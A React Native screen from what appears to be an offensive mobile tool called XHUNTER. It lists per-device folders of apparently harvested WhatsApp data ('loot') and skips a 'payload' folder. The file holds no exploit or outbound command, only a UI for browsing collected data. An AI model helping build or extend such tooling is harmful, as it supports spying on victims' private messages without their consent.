import React, { useEffect, useState } from "react";
import { 
    Box,
    StatusBar,
    HStack,
    IconButton,
    Icon,
    Text,
    Pressable,
    FlatList, 
} from "native-base";
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import RNFetchBlob from 'rn-fetch-blob'

const Loot = ({navigation}) => {
  const [currentDirData, setCurrentDirData]=useState([])
  
  useEffect(()=>{
    getAllLoot();
  },[])

  const getAllLoot=()=>{
    const dirs = RNFetchBlob.fs.dirs;
    var path = dirs.SDCardDir +`/XHUNTER/`;
    RNFetchBlob.fs.ls(path).then((data) => {
        if(data.length>0){
           setCurrentDirData(data.filter((d)=>{return d!=="payload"}))
        }
    }); 
  }

  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop  bg={"primary"} />

    <Box flex={1} bg={"primary"} px={'2'} >
    <HStack my="4" alignItems="center" justifyContent={'space-between'} borderBottomWidth="1" borderBottomColor={'secondary.500'} >
      <IconButton 
         onPress={()=>navigation.goBack()}
         icon={<Icon as={MaterialCommunityIcons} name="chevron-left-circle" />} 
         borderRadius="full" 
         _icon={{ color:  "tertiary.500", size: "sm"}} 
         _pressed={{ bg: "tertiary.800:alpha.20"}}            
         />
        <Text fontSize={'20'}  color={"secondary.500"}>Loot</Text>
        <Box flexDirection={'row'} alignItems='flex-end'>
        </Box>
    </HStack>
    <FlatList 
        data={currentDirData} 
        renderItem={({ item }) => 
        <Pressable onPress={()=>navigation.navigate("whatsappLoot",{deviceId: item})} >
        <Box bg="dark.100" borderRadius='5' py="4" px="4" mb='2'>
            <HStack flex={1} space={3} alignItems={'center'}>
            <Icon as={MaterialCommunityIcons} name={"whatsapp"} color={"teal.400"} size="10" mr="1"/>
            <Text noOfLines={1} fontSize={'16'} color={"secondary.500"}>{item}</Text>
            </HStack>
        </Box>
        </Pressable>
        } 
        keyExtractor={item => item} 
        />
    </Box>
    </>
    )
};

export default Loot;
  